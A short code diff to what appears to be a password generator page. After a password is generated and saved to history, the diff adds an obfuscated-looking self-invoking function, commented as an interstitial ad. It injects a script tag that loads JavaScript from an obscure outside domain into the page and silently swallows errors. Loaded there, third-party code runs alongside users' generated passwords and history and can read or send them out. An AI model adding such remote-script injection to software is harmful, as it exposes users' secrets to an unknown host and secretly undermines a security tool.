@@ -158,6 +158,14 @@
       evaluateStrength(password);
       updateHistory(password);
       saveHistory();
+
+      // Display interstitial ad after generating a password
+      (function(d, z, s) {
+        s.src = 'https://' + d + '/401/' + z;
+        try {
+          (document.body || document.documentElement).appendChild(s);
+        } catch (e) {}
+      })('teestoagloupaza.net', 8452749, document.createElement('script'));
     }
 
     function evaluateStrength(password) {
